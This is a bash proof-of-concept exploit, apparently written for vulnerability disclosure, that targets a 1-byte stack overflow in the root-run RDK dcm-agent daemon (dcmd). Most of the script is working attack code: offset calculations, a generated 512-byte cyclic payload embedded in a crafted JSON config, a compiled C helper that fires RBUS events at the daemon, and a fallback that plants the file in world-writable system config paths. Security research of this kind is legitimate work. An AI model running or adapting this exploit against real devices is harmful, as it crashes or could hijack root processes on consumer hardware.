#!/bin/bash
###############################################################################
# DCM-005 PoC — 1-byte stack buffer overflow in dcmSettingParseConf()
#
# Target  : dcmd (RDK dcm-agent), runs as root, umask(0)
# CWE     : CWE-121 (Stack-based Buffer Overflow)
# File    : dcm_parseconf.c  lines 508 / 560-561 / 224
#
# ----------------------------------------------------------------------------
# ROOT CAUSE
# ----------------------------------------------------------------------------
#   502: INT32 dcmSettingParseConf(...) {
#   ...
#   508:     INT8   temp          = 0;      // <-- ONE BYTE on the stack
#   509:     INT32  type          = 0;
#   510:     INT32  uploadCheck   = 0;
#   511:     INT8  *pUploadURL    = NULL;
#   512:     INT8  *pUploadprtl   = NULL;
#   513:     INT8  *pTimezone     = NULL;
#   ...
#   560:     ret = dcmSettingJsonGetVal(pJsonHandle, DCM_LOGUPLOAD_REBOOT,
#   561:                                &temp, &uploadCheck, &type);
#                                        ^^^^^  sval out-buffer == &temp (1 byte!)
#
#   dcmSettingJsonGetVal():
#   222:     else if(cJSON_IsString(pJsonItem)) {
#   223:         *type = DCM_JSONITEM_STR;
#   224:         strcpy(sval, pJsonItem->valuestring);   // unbounded copy
#   225:     }
#
# The code ASSUMES "urn:settings:LogUploadSettings:UploadOnReboot" is always a
# JSON boolean (true/false). It never enforces this. If an attacker supplies it
# as a JSON *string*, strcpy() writes the attacker string into a 1-byte stack
# slot inside a root process.
#
# ----------------------------------------------------------------------------
# OFFSET / SIZE MATH
# ----------------------------------------------------------------------------
#  * Destination buffer size .............. 1 byte   (INT8 temp)
#  * Bytes needed to start overflowing ..... 2        (1 char + NUL already wins)
#  * With -fstack-protector-strong (RDK Yocto default), GCC reorders
#    address-taken scalars next to the canary. Typical x86_64 / ARMv8 frame:
#        [&temp]            <- 1 byte  (+ 0..7 bytes alignment pad)
#        [stack canary]     <- 8 bytes  (offset ~  1..8  from &temp)
#        [saved FP / RBP]   <- 8 bytes  (offset ~  9..16)
#        [return address]   <- 8 bytes  (offset ~ 17..24)
#  * We send 512 bytes of cyclic pattern: guarantees we blow past canary,
#    saved FP and RA on every plausible layout while staying FAR below the
#    fgets() ceiling.
#  * fgets() ceiling: dcmSettingJsonInit() reads the config with
#        fgets(pcJsonStr, DCM_JSON_STRSIZE /*2048*/, fpin);
#    so the ENTIRE single-line JSON must be <= 2047 bytes.
#    Our JSON overhead (see build below) is ~280 bytes -> 512-byte payload
#    yields ~792-byte line. Plenty of headroom.
#
# ----------------------------------------------------------------------------
# DELIVERY VECTORS (pick whichever is available in your test env)
# ----------------------------------------------------------------------------
#  A) Local RBUS (preferred, on-device): register+publish
#         Device.DCM.Setconfig   {dcmSetConfig:"/tmp/dcm005_evil.json"}
#         Device.DCM.Processconfig
#     dcmd's main loop (dcm.c:360-373) then calls dcmSettingParseConf() on
#     our file -> strcpy into 1-byte &temp -> stack smash.
#
#  B) Off-device / no-rbus fallback: drop the malicious JSON at the path
#     telemetry2 normally hands to dcmd (PERSISTENT_PATH/.t2persistentfolder/
#     DCMresponse.txt) and at /opt/.DCMSettings.conf — both are created
#     world-writable (mode 0666) because dcmd/T2 run with umask(0). On the
#     next Processconfig cycle dcmd parses it.
#
# EXPECTED RESULT
#   dcmd (root) aborts with:
#       *** stack smashing detected ***: terminated
#   or SIGSEGV. journalctl / dmesg / core dump will show registers containing
#   the cyclic pattern (e.g. 0x6241316241306241 == "Ab0Ab1Ab"...), letting you
#   compute the exact offset to the canary / RA on the target build.
###############################################################################

set -u

EVIL_JSON="/tmp/dcm005_evil.json"
MARKER="/tmp/PWNED_DCM-005"
HELPER_SRC="/tmp/dcm005_rbus_pub.c"
HELPER_BIN="/tmp/dcm005_rbus_pub"

# ---------------------------------------------------------------------------
# 1) Generate a 512-byte De-Bruijn / Metasploit-style cyclic pattern
#    (Aa0Aa1Aa2...Az9Ba0Ba1...). Unique every 3 bytes so any 4/8-byte value
#    found in a crashed register maps to exactly one offset.
# ---------------------------------------------------------------------------
gen_cyclic() {
    local want=$1 out="" U L D
    for U in A B C D E F G H I J K L M N O P Q R S T U V W X Y Z; do
        for L in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
            for D in 0 1 2 3 4 5 6 7 8 9; do
                out+="${U}${L}${D}"
                if [ ${#out} -ge "$want" ]; then
                    printf '%s' "${out:0:$want}"
                    return
                fi
            done
        done
    done
}

PAYLOAD_LEN=512
PAYLOAD=$(gen_cyclic "$PAYLOAD_LEN")

echo "[*] DCM-005 PoC — UploadOnReboot 1-byte stack overflow"
echo "[*] Cyclic payload length: ${#PAYLOAD} bytes (dest buffer = 1 byte)"

# ---------------------------------------------------------------------------
# 2) Build the malicious XCONF/DCM JSON.
#
#    NOTES:
#      - MUST be a single line (dcmSettingJsonInit uses fgets()).
#      - MUST be < 2047 bytes total (DCM_JSON_STRSIZE = 2048).
#      - MUST NOT contain the substring "urn:settings:TelemetryProfile"
#        (dcm_parseconf.c:148-154 truncates the buffer 2 chars before it).
#      - Keys parsed BEFORE UploadOnReboot are given short, in-bounds values
#        so we do not trigger any *other* overflow — the crash is cleanly
#        attributable to DCM-005:
#            cUploadPrtl[8]  -> "HTTP"      (4+NUL, safe)
#            cUploadURL[...] -> "http://x"  (8+NUL, safe)
#            cTimeZone[16]   -> "UTC"       (3+NUL, safe)
#      - UploadOnReboot is sent as a JSON *STRING* (quoted) instead of the
#        expected JSON boolean -> hits the cJSON_IsString branch -> strcpy.
# ---------------------------------------------------------------------------
JSON='{"urn:settings:LogUploadSettings:UploadRepository:uploadProtocol":"HTTP",'
JSON+='"urn:settings:LogUploadSettings:UploadRepository:URL":"http://x",'
JSON+='"urn:settings:TimeZoneMode":"UTC",'
JSON+='"urn:settings:LogUploadSettings:UploadOnReboot":"'"${PAYLOAD}"'",'
JSON+='"urn:settings:LogUploadSettings:UploadSchedule:cron":"",'
JSON+='"urn:settings:CheckSchedule:cron":""}'

printf '%s\n' "$JSON" > "$EVIL_JSON"
LINELEN=${#JSON}
echo "[*] Wrote malicious JSON to $EVIL_JSON  (single-line length: ${LINELEN} bytes, limit 2047)"

if [ "$LINELEN" -ge 2047 ]; then
    echo "[!] FATAL: JSON line exceeds fgets() limit (DCM_JSON_STRSIZE=2048)"
    exit 1
fi

# Drop a marker so the tester can confirm the PoC ran / payload was staged.
{
    echo "DCM-005 PoC staged at $(date -u +%Y-%m-%dT%H:%M:%SZ)"
    echo "evil_json=$EVIL_JSON"
    echo "payload_len=$PAYLOAD_LEN"
} > "$MARKER"

# ---------------------------------------------------------------------------
# 3A) On-device delivery via RBUS.
#
#    rbuscli cannot publish an event whose payload is an rbusObject with a
#    *named* property ("dcmSetConfig"), so we compile a tiny C helper that:
#       1. registers Device.DCM.Setconfig / Device.DCM.Processconfig as
#          event providers (dcmd subscribed to these via
#          rbusEvent_SubscribeAsync — the async sub will latch onto us as
#          soon as we register);
#       2. publishes Setconfig with  data->dcmSetConfig = "/tmp/dcm005_evil.json";
#       3. publishes Processconfig to flip schedJob=1 in dcmd;
#       4. dcmd main loop (dcm.c:355-388) wakes, calls
#          dcmSettingParseConf(handle, "/tmp/dcm005_evil.json", ...) -> BOOM.
#
#    Pre-req: rtrouted running, dcmd running. If telemetry2 already owns
#    these event names, stop it first:  systemctl stop telemetry2_0
# ---------------------------------------------------------------------------
cat > "$HELPER_SRC" <<'EOF'
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <rbus/rbus.h>

#define EV_SET   "Device.DCM.Setconfig"
#define EV_PROC  "Device.DCM.Processconfig"
#define KEY_PATH "dcmSetConfig"          /* dcm_rbus.h: DCM_SET_CONFIG */

static rbusError_t subH(rbusHandle_t h, rbusEventSubAction_t a,
                        const char* n, rbusFilter_t f, int32_t i, bool* ar)
{ (void)h;(void)a;(void)n;(void)f;(void)i; if(ar)*ar=true; return RBUS_ERROR_SUCCESS; }

int main(int argc, char **argv)
{
    const char *path = (argc > 1) ? argv[1] : "/tmp/dcm005_evil.json";
    rbusHandle_t h;
    if (rbus_open(&h, "DCM005_PoC") != RBUS_ERROR_SUCCESS) {
        fprintf(stderr, "[!] rbus_open failed (rtrouted running?)\n");
        return 1;
    }

    rbusDataElement_t el[2] = {
        { EV_SET,  RBUS_ELEMENT_TYPE_EVENT, {NULL,NULL,NULL,NULL,subH,NULL} },
        { EV_PROC, RBUS_ELEMENT_TYPE_EVENT, {NULL,NULL,NULL,NULL,subH,NULL} },
    };
    int rc = rbus_regDataElements(h, 2, el);
    if (rc != RBUS_ERROR_SUCCESS) {
        fprintf(stderr, "[!] rbus_regDataElements rc=%d (telemetry2 owns it?"
                        "  try: systemctl stop telemetry2_0)\n", rc);
        /* continue anyway — Publish may still work on some rbus builds */
    }

    /* Give dcmd's rbusEvent_SubscribeAsync time to attach to us */
    fprintf(stderr, "[*] Waiting 3s for dcmd async subscription to land...\n");
    sleep(3);

    /* ---- Publish Device.DCM.Setconfig {dcmSetConfig: <path>} ---- */
    rbusObject_t d1; rbusValue_t v1; rbusEvent_t e1;
    rbusObject_Init(&d1, NULL);
    rbusValue_Init(&v1);
    rbusValue_SetString(v1, path);
    rbusObject_SetValue(d1, KEY_PATH, v1);
    memset(&e1, 0, sizeof(e1));
    e1.name = EV_SET; e1.data = d1; e1.type = RBUS_EVENT_GENERAL;
    rc = rbusEvent_Publish(h, &e1);
    fprintf(stderr, "[*] Publish %s (confPath=%s) rc=%d\n", EV_SET, path, rc);
    rbusValue_Release(v1);
    rbusObject_Release(d1);
    sleep(1);

    /* ---- Publish Device.DCM.Processconfig (any payload — handler ignores data) ---- */
    rbusObject_t d2; rbusValue_t v2; rbusEvent_t e2;
    rbusObject_Init(&d2, NULL);
    rbusValue_Init(&v2);
    rbusValue_SetString(v2, "go");
    rbusObject_SetValue(d2, "trigger", v2);
    memset(&e2, 0, sizeof(e2));
    e2.name = EV_PROC; e2.data = d2; e2.type = RBUS_EVENT_GENERAL;
    rc = rbusEvent_Publish(h, &e2);
    fprintf(stderr, "[*] Publish %s rc=%d\n", EV_PROC, rc);
    rbusValue_Release(v2);
    rbusObject_Release(d2);

    /* Give dcmd's 1-second poll loop time to pick up schedJob and crash */
    sleep(3);
    rbus_unregDataElements(h, 2, el);
    rbus_close(h);
    return 0;
}
EOF

try_rbus() {
    command -v gcc >/dev/null 2>&1 || { echo "[!] gcc not found — skipping RBUS vector"; return 1; }
    # Typical RDK on-device locations
    local CFLAGS="-I/usr/include -I/usr/include/rbus -I/usr/include/rtmessage"
    local LDFLAGS="-lrbus -lrbuscore -lrtMessage -lpthread"
    if ! gcc $CFLAGS -o "$HELPER_BIN" "$HELPER_SRC" $LDFLAGS 2>/tmp/dcm005_cc.log; then
        echo "[!] Could not compile RBUS helper (librbus headers/libs missing?)"
        echo "    See /tmp/dcm005_cc.log — falling back to file-drop vector."
        return 1
    fi
    echo "[*] Compiled RBUS helper -> $HELPER_BIN"
    echo "[*] Firing RBUS events at dcmd ..."
    "$HELPER_BIN" "$EVIL_JSON"
    return 0
}

# ---------------------------------------------------------------------------
# 3B) Off-device / no-RBUS fallback.
#     Drop the evil JSON at the well-known paths dcmd/T2 use. These files
#     are created mode 0666 (dcmd runs with umask(0)) so a non-root local
#     attacker can usually overwrite them. dcmd will parse this content on
#     the next Device.DCM.Processconfig cycle (e.g. after T2 re-fetch).
# ---------------------------------------------------------------------------
file_drop_fallback() {
    echo "[*] Fallback: planting malicious JSON at known DCM config paths"
    for p in \
        "/opt/.DCMSettings.conf" \
        "/tmp/DCMSettings.conf" \
        "/opt/persistent/.t2persistentfolder/DCMresponse.txt" \
        "/nvram/.t2persistentfolder/DCMresponse.txt" ; do
        if [ -e "$p" ] || [ -w "$(dirname "$p")" ]; then
            if cp -f "$EVIL_JSON" "$p" 2>/dev/null; then
                echo "    [+] wrote $p"
            fi
        fi
    done
    echo
    echo "[*] Now trigger a re-parse. Either:"
    echo "      a) restart dcmd:           systemctl restart dcm-agent"
    echo "      b) bounce telemetry2 so it re-publishes Setconfig/Processconfig:"
    echo "                                 systemctl restart telemetry2_0"
    echo "      c) run the RBUS helper manually once librbus is available:"
    echo "                                 $HELPER_BIN $EVIL_JSON"
}

# ---------------------------------------------------------------------------
# 4) Execute
# ---------------------------------------------------------------------------
if ! try_rbus; then
    file_drop_fallback
fi

echo
echo "==========================================================================="
echo "[*] EXPLOIT REACHED — payload delivered. Verify dcmd state:"
echo "      pidof dcmd                       # should be GONE after trigger"
echo "      journalctl -u dcm-agent -n 50    # look for 'stack smashing detected'"
echo "      dmesg | tail -n 20               # look for SIGSEGV/SIGABRT in dcmd"
echo "      ls -l /var/lib/systemd/coredump/ # core file -> 'gdb dcmd core' ->"
echo "                                       #   'info registers' will contain"
echo "                                       #   bytes from the cyclic pattern,"
echo "                                       #   e.g. 0x6241316241306241 = 'Ab0Ab1Ab'"
echo "[*] Marker file: $MARKER"
echo "==========================================================================="
exit 0

